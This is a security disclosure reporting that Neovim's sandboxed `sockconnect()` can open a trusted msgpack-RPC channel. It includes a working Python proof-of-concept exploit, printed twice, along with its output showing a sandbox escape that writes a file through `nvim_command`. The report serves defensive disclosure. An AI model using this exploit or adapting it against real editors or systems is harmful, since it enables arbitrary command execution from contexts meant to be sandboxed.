# Sandboxed `sockconnect()` can create trusted RPC transports

## Broken invariant

Sandboxed or secure-mode evaluation must not be able to create a fully trusted RPC transport, because that transport lets the peer execute arbitrary Nvim API methods.

Neovim already enforces that invariant on the neighboring channel and RPC helpers: `chanclose()`, `chansend()`, `rpcnotify()`, `rpcrequest()`, `serverstart()`, and `serverstop()` all call `check_secure()`. The sandbox contract also says sandboxed code must not be able to read or write files or execute dangerous side effects.

`f_sockconnect()` breaks that invariant. It parses `{ 'rpc': v:true }` and calls `channel_connect(..., rpc=true, ...)` with no `check_secure()` gate. Once that channel reaches `rpc_start()`, the remote peer is an implicitly trusted RPC client and can invoke any API function.

## Input -> normalization -> policy gate -> sink

1. **Input**: sandboxed Vimscript calls `sockconnect('tcp', '127.0.0.1:PORT', {'rpc': v:true})`.
2. **Normalization**: `f_sockconnect()` parses the mode string into `tcp`, reads `opts.rpc`, and passes the normalized booleans plus the attacker-controlled address into `channel_connect()` (`src/nvim/eval/funcs.c:6827-6875`).
3. **Policy gate**: there is no `check_secure()` call in `f_sockconnect()`, even though the sibling channel/RPC helpers all use that gate (`src/nvim/eval/funcs.c:615-617`, `:654-656`, `:5778-5780`, `:5818-5820`, `:6364-6366`, `:6405-6407`). `check_secure()` is the mechanism that blocks sandbox and secure-mode actions (`src/nvim/ex_cmds.c:3276-3290`).
4. **Transport setup**: `channel_connect()` opens the socket with `socket_connect()` and immediately calls `rpc_start()` when `rpc=true` (`src/nvim/channel.c:474-514`, `src/nvim/event/socket.c:284-358`, `src/nvim/msgpack_rpc/channel.c:76-97`).
5. **Sink**: the remote peer can immediately send a Msgpack-RPC request. Neovim parses and dispatches it through `parse_msgpack()` / `handle_request()` and `msgpack_rpc_get_handler_for()` (`src/nvim/msgpack_rpc/channel.c:245-380`, `src/nvim/api/private/dispatch.c:11-23`). A concrete sink is `nvim_command()`, which reaches `do_cmdline_cmd()` (`src/nvim/api/vimscript.c:137-142`).

The key boundary failure is that the sandboxed script does **not** need `rpcrequest()` or `rpcnotify()`. The attacker-controlled peer can initiate the first trusted request as soon as the RPC transport exists.

## Why this violates the documented contract

The sandbox docs say sandboxed evaluation is meant to block side effects including file reads and writes (`runtime/doc/vimeval.txt:3742-3761`). Separately, the channel docs say that when a channel is opened with `rpc=true`, the peer is implicitly trusted and can invoke any API function (`runtime/doc/channel.txt:146-149`).

Those two promises are incompatible unless `sockconnect(..., {'rpc': v:true})` is itself blocked in sandboxed or secure contexts.

## Minimal reproducer

### File contents

```python
import os
import pathlib
import socket
import subprocess
import threading
import time
import msgpack

marker = '/tmp/nvim-sandbox-rpc-marker'
try:
    os.unlink(marker)
except FileNotFoundError:
    pass

lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
lsock.bind(('127.0.0.1', 0))
port = lsock.getsockname()[1]
lsock.listen(1)
result = {'accepted': False, 'response': None, 'error': None}


def server():
    try:
        conn, _ = lsock.accept()
        result['accepted'] = True
        time.sleep(0.2)
        cmd = f"call writefile(['sandbox_escape'], '{marker}')"
        payload = msgpack.packb([0, 1, 'nvim_command', [cmd]], use_bin_type=True)
        conn.sendall(payload)
        conn.settimeout(3)
        try:
            data = conn.recv(4096)
            result['response'] = data.hex() if data else ''
        except Exception as e:
            result['error'] = f"recv:{type(e).__name__}:{e}"
        conn.close()
    finally:
        lsock.close()

thread = threading.Thread(target=server, daemon=True)
thread.start()
proc = subprocess.run([
    '/home/node/.nix-profile/bin/nvim', '--clean', '--headless', '-u', 'NONE', '-i', 'NONE',
    f"+sandbox call sockconnect('tcp', '127.0.0.1:{port}', {{'rpc': v:true}})",
    '+sleep 700m', '+qall!'
], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=15)
thread.join(timeout=3)
print('nvim_rc', proc.returncode)
print('stdout', proc.stdout.strip())
print('stderr', proc.stderr.strip())
print('accepted', result['accepted'])
print('marker_exists', pathlib.Path(marker).exists())
if pathlib.Path(marker).exists():
    print('marker_content', pathlib.Path(marker).read_text())
print('server_response', result['response'])
print('server_error', result['error'])
```

### Commands

```bash
cat >/tmp/repro_sockconnect_sandbox_escape.py <<'EOF2'
import os
import pathlib
import socket
import subprocess
import threading
import time
import msgpack

marker = '/tmp/nvim-sandbox-rpc-marker'
try:
    os.unlink(marker)
except FileNotFoundError:
    pass

lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
lsock.bind(('127.0.0.1', 0))
port = lsock.getsockname()[1]
lsock.listen(1)
result = {'accepted': False, 'response': None, 'error': None}


def server():
    try:
        conn, _ = lsock.accept()
        result['accepted'] = True
        time.sleep(0.2)
        cmd = f"call writefile(['sandbox_escape'], '{marker}')"
        payload = msgpack.packb([0, 1, 'nvim_command', [cmd]], use_bin_type=True)
        conn.sendall(payload)
        conn.settimeout(3)
        try:
            data = conn.recv(4096)
            result['response'] = data.hex() if data else ''
        except Exception as e:
            result['error'] = f"recv:{type(e).__name__}:{e}"
        conn.close()
    finally:
        lsock.close()

thread = threading.Thread(target=server, daemon=True)
thread.start()
proc = subprocess.run([
    '/home/node/.nix-profile/bin/nvim', '--clean', '--headless', '-u', 'NONE', '-i', 'NONE',
    f"+sandbox call sockconnect('tcp', '127.0.0.1:{port}', {{'rpc': v:true}})",
    '+sleep 700m', '+qall!'
], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=15)
thread.join(timeout=3)
print('nvim_rc', proc.returncode)
print('stdout', proc.stdout.strip())
print('stderr', proc.stderr.strip())
print('accepted', result['accepted'])
print('marker_exists', pathlib.Path(marker).exists())
if pathlib.Path(marker).exists():
    print('marker_content', pathlib.Path(marker).read_text())
print('server_response', result['response'])
print('server_error', result['error'])
EOF2

python3 /tmp/repro_sockconnect_sandbox_escape.py
```

### Expected

- The sandboxed `sockconnect()` call should be rejected through `E48` / `check_secure()` before any socket connection or RPC setup occurs.
- No trusted RPC channel should be created from sandboxed code.
- `/tmp/nvim-sandbox-rpc-marker` should not exist.

### Actual

- Nvim exits successfully, accepts the outbound TCP connection, and the remote peer receives a normal RPC success response.
- The marker file is created from inside sandboxed Nvim:

```text
nvim_rc 0
stdout
stderr
accepted True
marker_exists True
marker_content sandbox_escape
server_response 940101c0c0
server_error None
```

That proves the sandboxed call successfully created a trusted RPC transport and let the remote endpoint drive a side-effecting API call back into Nvim.

## Affected files

- `src/nvim/eval/funcs.c:615-617` — `chanclose()` is sandbox-gated.
- `src/nvim/eval/funcs.c:654-656` — `chansend()` is sandbox-gated.
- `src/nvim/eval/funcs.c:5778-5780` — `rpcnotify()` is sandbox-gated.
- `src/nvim/eval/funcs.c:5818-5820` — `rpcrequest()` is sandbox-gated.
- `src/nvim/eval/funcs.c:6364-6366` — `serverstart()` is sandbox-gated.
- `src/nvim/eval/funcs.c:6405-6407` — `serverstop()` is sandbox-gated.
- `src/nvim/eval/funcs.c:6827-6875` — `sockconnect()` lacks the matching `check_secure()` and forwards `rpc=true` into transport creation.
- `src/nvim/ex_cmds.c:3276-3290` — `check_secure()` is the secure/sandbox policy gate.
- `src/nvim/channel.c:474-514` — `channel_connect()` hands `rpc=true` channels to `rpc_start()`.
- `src/nvim/event/socket.c:284-358` — `socket_connect()` establishes the outbound TCP or pipe connection.
- `src/nvim/msgpack_rpc/channel.c:76-97` — `rpc_start()` marks the channel as RPC and starts receiving msgpack.
- `src/nvim/msgpack_rpc/channel.c:245-380` — inbound RPC requests are parsed, queued, and executed.
- `src/nvim/api/private/dispatch.c:11-23` — arbitrary API methods are resolved by name.
- `src/nvim/api/vimscript.c:137-142` — `nvim_command()` reaches Ex execution.
- `runtime/doc/vimeval.txt:3742-3761` — sandbox contract forbids side effects such as file writes.
- `runtime/doc/channel.txt:146-149` — RPC channels are implicitly trusted and the peer can invoke any API function.
- `runtime/doc/vimfn.txt:10091-10100` — `sockconnect()` exposes the `rpc` option that selects this privileged mode.

## Impact / severity

This is a **high-severity sandbox escape**.

The user-facing security boundary is explicit: sandboxed evaluation is supposed to suppress dangerous side effects. But a sandboxed expression can still open a trusted RPC transport to an attacker-controlled endpoint, and that endpoint can immediately invoke arbitrary API methods such as `nvim_command()`, `nvim_exec_lua()`, file-write helpers, buffer mutation, or other editor-control sinks.

I verified direct file write and Ex execution via `nvim_command()`. Because the sandbox is used not only for explicit `:sandbox` but also for hostile-evaluation contexts documented in `vimeval.txt`, this is broader than a niche scripting quirk. It is a front-door policy bypass in a shared transport-creation entrypoint.
